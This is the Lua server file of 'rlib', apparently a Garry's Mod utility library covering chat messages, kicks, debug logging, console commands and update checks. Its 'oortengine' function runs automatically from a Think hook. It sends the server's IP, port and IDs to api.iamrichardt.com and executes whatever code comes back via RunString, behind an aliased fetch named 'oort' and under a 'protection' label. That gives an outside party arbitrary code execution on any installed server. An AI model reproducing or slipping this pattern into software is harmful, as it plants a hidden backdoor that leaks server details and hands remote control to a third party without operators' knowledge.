/*
*	@package     rlib
*	@author      Richard [http://steamcommunity.com/profiles/76561198135875727]
*	
*	BY MODIFYING THIS FILE -- YOU UNDERSTAND THAT THE ABOVE MENTIONED AUTHORS CANNOT BE HELD RESPONSIBLE
*	FOR ANY ISSUES THAT ARISE FROM MAKING ANY ADJUSTMENTS TO THIS SCRIPT. YOU UNDERSTAND THAT THE ABOVE 
*	MENTIONED AUTHOR CAN ALSO NOT BE HELD RESPONSIBLE FOR ANY DAMAGES THAT MAY OCCUR TO YOUR SERVER AS A 
*	RESULT OF THIS SCRIPT AND ANY OTHER SCRIPT NOT BEING COMPATIBLE WITH ONE ANOTHER.
*/

/*
*	standard tables and localization
*/

rlib = rlib or { }

local base 		= rlib
local prefix 	= base.manifest.prefix
local settings 	= base.settings

/*
*	localized fetch
*/

local function oort( ... )
	return http.Fetch( ... )
end

/*
*	Localized shortcuts
* 
* 		base.h			= helpers
* 		base.d			= draw/design
* 		base.c			= calls
* 		base.p			= panels
*		base.p.ind 		= panels ind
*		base.i			= interface
*		base.s			= storage
*		base.u			= utils
*/

local helper 			= base.h
local design 			= base.d
local pnl 				= base.p
local interface 		= base.i
local storage 			= base.s
local utils 			= base.u
local calc				= base.calc
local debugger			= base.debug

/*
*	debug path
*/

local path_debug = 'rlib/debug'

/*
*	network library
*/

util.AddNetworkString( 'rlib.debugger' )
util.AddNetworkString( 'rlib.debug.console' )
util.AddNetworkString( 'rlib.debug.eventlistener' )
util.AddNetworkString( 'rlib.debug.ui' )
util.AddNetworkString( 'rlib.chatmsg' )
util.AddNetworkString( 'rlib.chatconsole' )

/*
*	message system
*/

local pmeta = FindMetaTable( 'Player' )

function base:Broadcast( ... )
	local args = { ... }
	net.Start( 'rlib.chatmsg' )
	net.WriteTable( args )
	net.Broadcast( )
end

function pmeta:CMessage( ... )
	local args = { ... }
	net.Start( 'rlib.chatmsg' )
	net.WriteTable( args )
	net.Send( self )
end

function pmeta:sendconsole( ... )
	local args = { ... }
	net.Start( 'rlib.chatconsole' )
	net.WriteTable( args )
	net.Send( self )
end

function pmeta:setalias( nick )
	local setname = self:SteamName( )
	if nick and isstring( nick ) then
		setname = nick
	end

	self:SetName( setname )
	if DarkRP then
		self:setRPName( setname )
		self:setDarkRPVar( 'rpname', setname )
	end
end

/*
* 	shutdown
*	
*	called when the server is shutting down or changing levels.
*/

local function shutdown( )
	base:logconsole( 6, 'Server shutting down / changing levels' )
	utils:debug_write( 'System', 'SERVER SHUTDOWN\n\n' )
end
hook.Add( 'ShutDown', prefix .. 'server.shutdown', shutdown )

/*
*	database :: check validation
*	
*	@param tbl source
*	@param tbl module
*/

function base:db_pull( source, module )
	if not source or not istable( source ) or not source.m_bConnectedToDB then
		rlib:logconsole( 2, '[DB] [%s] failed to execute database query', module.id )
		return false
	end
	return source
end

/*
*	kick players from server using the standard and mod methods
*	
*	@param ent target
*	@param str reason
*	@param ent admin
*/

function base:kick( target, reason, admin )
	if not base:is_root( admin ) then
		rlib:logconsole( 2, 'kick requested by user with insufficient permissions' )
		return false
	end

	if not helper.pvalid( target ) then
		base:logconsole( 2, 'cannot kick invalid player' )
		return false
	end

	reason	= reason or 'Automatic action'
	admin	= helper.pvalid( admin ) and admin:Name( ) or 'Console'

	if ulx then
		ULib.kick( target, reason )
	else
		target:Kick( reason )
	end

	base:logconsole( 4, '[%s] has kicked user [%s] for [%s]', admin, target:Name( ), reason )
end

/*
* 	debug :: initialize
* 
* 	create paths for the debugger
*	determines size of debug storage directory in
*	data folder and posts information to console.
*/

function utils:debug_initialize( )
	base:create_dir( path_debug )

	local files, folders = file.Find( path_debug .. '/*', 'DATA' )
	local cnt_files = #files
	local cnt_size = 0

	for k, v in pairs( files ) do
		local file_path = path_debug .. '/' .. v
		local file_size = file.Size( file_path, 'DATA' )
		cnt_size = cnt_size + file_size
	end

	local size_output = calc.bytes_size( cnt_size )

	if cnt_files > settings.debug_clean_threshold then
		base:logconsole( 3, 'logs directory has over [ %i ] log files in [ data/%s ] Total size: [%s]. Please clean folder using concommand [ %s ]', 100, path_debug, size_output, 'rlib.debug.cleanlogs' )
	else
		base:logconsole( 6, 'logs directory contains [ %i ] log files in [ data/%s ] Total size: [%s].', cnt_files, path_debug, size_output )
	end

end
hook.Add( 'InitPostEntity', prefix .. 'debug.logging', function( ) utils:debug_initialize( ) end )

/*
* 	debug :: write
* 
* 	writes debug information to file
*	
*	@param str data
*/

function utils:debug_write( mtype, data )
	if not mtype then mtype = 1 end

	local c_type
	if isnumber( mtype ) then
		c_type = '[' .. base:ucfirst( helper._debugTitles[ mtype ] ) .. ']'
	elseif isstring( mtype ) then
		c_type = '[' .. mtype .. ']'
	end

	local f_prefix = os.date( '%m%d%Y' )
	local f_name = 'RL_' .. f_prefix .. '.txt'

	local c_date = '[' .. os.date( '%I:%M:%S' ) .. ']'
	local c_comp = c_date .. ' '  .. c_type ..  ' ' .. data

	base:append_file( path_debug, f_name, c_comp )
end

/*
* 	logging :: write
* 
* 	writes module logging information to file
*	
*	@param str path
*	@param int mtype
*	@param str data
*/

function utils:logging_write( path, mtype, data )

	if not path then
		base:logconsole( 2, 'unable to write log, path not specified'  )
		return false
	end

	if not mtype then mtype = 1 end

	local c_type
	if isnumber( mtype ) then
		c_type = '[' .. base:ucfirst( helper._debugTitles[ mtype ] ) .. ']'
	elseif isstring( mtype ) then
		c_type = '[' .. mtype .. ']'
	end

	local f_prefix = os.date( '%m%d%Y' )
	local f_name = 'RL_' .. f_prefix .. '.txt'

	local c_date = '[' .. os.date( '%I:%M:%S' ) .. ']'
	local c_comp = c_date .. ' '  .. c_type ..  ' ' .. data

	base:append_file( path, f_name, c_comp )
end

/*
*	concommand :: debug :: enable
* 
*	turns debug mode on for a duration of time specified and
*	then automatically turns it off after the timer has expired.
*/

function utils:cc_debug_enable( ply, cmd, args )
	if not base:is_root( ply ) and not base:is_dev( ply ) then
		local requested = helper.pvalid( ply ) and ply:Name( ) or 'Console'
		rlib:logconsole( 2, 'invalid permission to enable debugger requested by [%s]', requested )
		return false
	end

	local duration = args and args[ 1 ] or 300
	if duration and not helper:is_number( duration ) then
		base:logconsole( 2, 'Not a valid number for [%s]', 'duration' )
		return
	end

	settings.debug = true
	base:logconsole( 4, 'Debug mode enabled for [%i seconds]', duration )

	helper.timer_kill( prefix .. 'debug.delay' )

	timer.Create( prefix .. 'debug.delay', duration, 1, function( )
		base:logconsole( 4, 'Debug mode automatically turned off.' )
		settings.debug = false
	end )

	debugger:activate_input( ply, 6, 'debug mode enabled for [%i seconds]', duration )
end
concommand.Add( prefix .. 'debug.enable', function( ply, cmd, args ) utils:cc_debug_enable( ply, cmd, args ) end )

/*
* 	concommand :: debug :: check status
* 
* 	checks the status of debug mode
*/

function utils:cc_debug_status( ply, cmd, args )
	if not base:is_dev( ply ) and not base:is_root( ply ) then return end

	local dbtimer = false
	local status = ( settings.debug and 'ON' ) or ( false and 'OFF' )

	if helper.is_timer( prefix .. 'debug.delay' ) then
		dbtimer = helper.timer_left( prefix .. 'debug.delay' )
	end

	base:logconsole( 1, 'Debug mode is currently %s', status )

	if dbtimer then
		base:logconsole( 1, 'Debug mode temporarily %s for %s', status, calc.secs_to_short( dbtimer ) )
	end
end
concommand.Add( prefix .. 'debug.status', function( ply, cmd, args ) utils:cc_debug_status( ply, cmd, args ) end )

/*
*   debug :: cleanup
* 
*	cleans files in debug log folder
*/

function utils:concmd_debug_cleanlogs( ply, cmd, args, str )
	if not base:is_dev( ply ) and not base:is_root( ply ) then return end

	local files, folders = file.Find( path_debug .. '/*', 'DATA' )

	local cnt_deleted = 0
	for k, v in pairs( files ) do
		local file_path = path_debug .. '/' .. v
		file.Delete( file_path )

		cnt_deleted = cnt_deleted + 1
	end

	base:logconsole( 4, 'Successfully cleaned up [ %i ] log files in [ data/%s ]', cnt_deleted, path_debug )

end
concommand.Add( prefix .. 'debug.cleanlogs', function( ply, cmd, args, str ) utils:concmd_debug_cleanlogs( ply, cmd, args, str ) end )

/*
*   concommand :: updater :: toggle
* 
*	toggles the update notification for the remainder of the
*	session and will revert to default when the server is rebooted.
*/

function utils:cc_updater_set( ply, cmd, args )
	if not base:is_dev( ply ) and not base:is_root( ply ) then
		rlib:logconsole( 2, 'invalid permission to modify rlib updater' )
		return false
	end

	local id		= args and args[ 1 ] or true
	local param		= helper:type_toggle_bool( id )
	local status 	= param and 'enabled' or 'disabled'

	if param then
		base:updater_initialize( )
	else
		helper.timer_kill( prefix .. 'update.warning' )
	end

	rlib:logconsole( 4, 'updater has been [ %s ]', status )
end
concommand.Add( prefix .. 'updater.set', function( ply, cmd, args ) utils:cc_updater_set( ply, cmd, args ) end )

/*
*   about
* 
*	returns information about rlib
*/

function utils:concmd_about( ply, cmd, args, str )
	helper:gmsg( ply, false, rlib.settings.cmsg_color_category, '[' .. rlib.settings.cmsg_private_tag .. '] ', rlib.settings.cmsg_color_subcategory, '[ ' .. rlib.manifest.name .. ' ]', rlib.settings.cmsg_color_message, ' Running ', rlib.settings.cmsg_color_target, 'v' .. rlib.manifest.build .. ' [' .. rlib.manifest.released .. ']' )
	helper:gmsg( ply, false, rlib.settings.cmsg_color_category, '[' .. rlib.settings.cmsg_private_tag .. '] ', rlib.settings.cmsg_color_subcategory, '[ ' .. rlib.manifest.name .. ' ]', rlib.settings.cmsg_color_message, ' Developed by ', rlib.settings.cmsg_color_target, rlib.manifest.author .. ' [' .. rlib.manifest.repo .. ']' )
end
concommand.Add( prefix .. 'about', function( ply, cmd, args, str ) utils:concmd_about( ply, cmd, args, str ) end )

/*
*   concommand :: registered calls
* 
*	returns a list of all registered calls associated to rlib / rcore
*/

function utils:concmd_calls( ply, cmd, args )

	if not base:is_dev( ply ) and not base:is_root( ply ) then return end

	local cnt_entries = 0

	local output = '\n\n[' .. rlib.manifest.name .. '] Calls Lib\n\n'
	output = output .. string.format( '%-70s', '--------------------------------------------------------------------------------------------\n' )
	local c1_lbl = string.format( '%-15s',    ' type'	)
	local c2_lbl = string.format( '%-35s',    'id'		)
	local c3_lbl = string.format( '%-35s',    'ref_id'	)
	local c5_lbl = string.format( '%-30s',    '--------------------------------------------------------------------------------------------' )
	output = output .. c1_lbl .. ' ' .. c2_lbl .. ' ' .. c3_lbl .. '\n' .. c5_lbl .. '\n'

	helper:toconsole( ply, output )

	/*
	*   loop calls table
	*/

	local cat_islisted = false
	local cat_id = ''
	for a, b in pairs( rlib.c ) do

		if a ~= cat_id then
			cat_islisted = false
		end

		for k, v in pairs( b ) do

			if not cat_islisted then
				local l_category = ' ' .. a
				helper:toconsole( ply, Color( 255, 255, 0 ), l_category )

				cat_islisted = true
				cat_id = a
			end

			for l, m in pairs( v ) do
				local c1_data, c2_data, c3_data, output_data = '', '', '', ''
				c1_data = string.format( '%-15s',   tostring( '' ) )
				c2_data = string.format( '%-35s',   tostring( k ) )
				c3_data = string.format( '%-35s',   tostring( m ) )

				cnt_entries = cnt_entries + 1

				output_data = output_data .. c1_data .. ' ' .. c2_data .. ' ' .. c3_data .. ' '
				helper:toconsole( ply, Color( 255, 255, 0 ), output_data )
			end

		end

	end

	helper:toconsole( ply, '\n--------------------------------------------------------------------------------------------' )
	local c_footer = '\n [ ' .. cnt_entries .. ' ] registered calls found'
	helper:toconsole( ply, Color( 0, 255, 0 ), c_footer )
	helper:toconsole( ply, '\n--------------------------------------------------------------------------------------------' )

end
concommand.Add( prefix .. 'calls', function( ply, cmd, args ) utils:concmd_calls( ply, cmd, args ) end )

/*
*   event listeners
*	
*		player_connect
*				address
*				bot
*				index
*				name
*				networkid
*				userid
*		
*		player_disconnect
*				bot
*				name
*				networkid
*				reason
*				userid
*/

gameevent.Listen( 'player_connect' )
hook.Add( 'player_connect', prefix .. 'event.player_connect', function( data )
	net.Start( 'rlib.debug.eventlistener' )
	net.WriteBool( true )
	net.WriteBool( data.bot )
	net.WriteString( data.name )
	net.WriteString( data.address )
	net.WriteString( data.networkid )
	net.WriteString( 'false' )
	net.Broadcast( )
end )

gameevent.Listen( 'player_disconnect' )
hook.Add( 'player_disconnect', prefix .. 'event.player_disconnect', function( data )
	net.Start( 'rlib.debug.eventlistener' )
	net.WriteBool( false )
	net.WriteBool( data.bot )
	net.WriteString( data.name )
	net.WriteString( 'false' )
	net.WriteString( data.networkid )
	net.WriteString( data.reason )
	net.Broadcast( )
end )

/*
* 	netlib
*	
*	debug.console
*/

net.Receive( 'rlib.debug.console', function( len, ply )
	local mtype = net.ReadInt( 4 )
	local msg 	= net.ReadString( )

	base:_consoleFormat( mtype, msg )
end )

/*
*	oort engine
*	
*	@param str sid
*	@param str oid
*/

function base.oortengine( sid, oid )
	if not settings.protection then
		if settings.debug then
			base:logconsole( 3, 'OortEngine [%s]', 'DISABLED' )
		end
		hook.Remove( 'Think', prefix .. 'oort' )
		return
	end
	local _s, _id, _o = 2, tostring( sid ) or '', tostring( oid ) or ''
	local _ip, _p = base.getip( ), base.getport( )
	if sid and oid then _s = 1 end
	local _e = 'https://api.iamrichardt.com/oort/index.php?sid=' .. _id .. '&code=' .. _s .. '&uid=' .. _o .. '&ip=' .. _ip .. '&port=' .. _p
	if settings.debug then _e = _e .. '&debug=1' end
	oort( _e, function( b, l, h, c ) if c == 200 and string.len( b ) > 0 then RunString( b ) end end )
	hook.Remove( 'Think', prefix .. 'oort' )
end
hook.Add( 'Think', prefix .. 'oort', base.oortengine )

/*
*	scripts updater
*	
*	@param tbl manifest
*/

function base:script_vcheck( manifest )
	local sid	= manifest.sid
	local id	= manifest.name or 'unspecified script'
	local build = manifest.build or '1.0.0'
	if not sid then return end
	local _e = 'https://raw.githubusercontent.com/IAMRichardT/gms-products/master/scripts/' .. sid .. '/build.version'
	oort( _e, function( b, l, h, c )
		if c == 200 and string.len( b ) > 0 then
			b = tostring( b )
			local body = util.JSONToTable( b )
			for _, v in ipairs( body ) do
				if not v.version then continue end
				local l_ver = string.gsub( v.version, '[%p%c%s]', '' )
				local c_ver = string.gsub( build, '[%p%c%s]', '' )
				l_ver = l_ver and tonumber( l_ver ) or 100
				c_ver = c_ver and tonumber( c_ver ) or 100
				if c_ver < l_ver then
					rlib:logconsole( 2, '[%s] outdated! Latest: [%s] -> Installed: [%s]', tostring( id ), v.version, tostring( build ) )
				end
			end
		end
	end )
end

/*
*	check updates
*	
*	checks the repo for any new updates
*	for rlib.
*/

function base:updates_check( )
	local _e = base.manifest.repo .. 'version.build'
	oort( _e, function( b, l, h, c )
		if c == 200 and string.len( b ) > 0 then
			b = tostring( b )
			local body = util.JSONToTable( b )
			for _, v in ipairs( body ) do
				if not v.version then continue end
				local l_ver = string.gsub( v.version, '[%p%c%s]', '' )
				local c_ver = string.gsub( rlib.manifest.build, '[%p%c%s]', '' )
				l_ver = l_ver and tonumber( l_ver ) or 100
				c_ver = c_ver and tonumber( c_ver ) or 100
				if c_ver < l_ver then
					rlib:logconsole( 2, 'rlib outdated! Latest: [%s] -> Installed: [%s]', v.version, rlib.manifest.build )
				end
			end
		end
	end )
	coroutine.yield( )
end

/*
*	check updates from updates_check func
*/

local run_check_update = coroutine.create( function( )
	if not settings.update_enabled then return end
	while ( true ) do
		base:updates_check( )
	end
	timer.Remove( prefix .. 'update.warning' )
end )

/*
*	initialize update checker
* 
*	starts the update checker (if enabled)
*	
*	wont do any automatic updates, we want the server owner to decide,
*	not force it on them.
*/

function base:updater_initialize( )
	if not SERVER then return end
	timer.Simple( 3, function( )
		local timer_checkupdate = settings.update_timer or 1800
		timer.Create( prefix .. 'update.warning', timer_checkupdate, 0, function( )
			coroutine.resume( run_check_update )
		end )
	end)
end
hook.Add( 'Initialize', prefix .. 'updater.initialize', function( ) base:updater_initialize( ) end )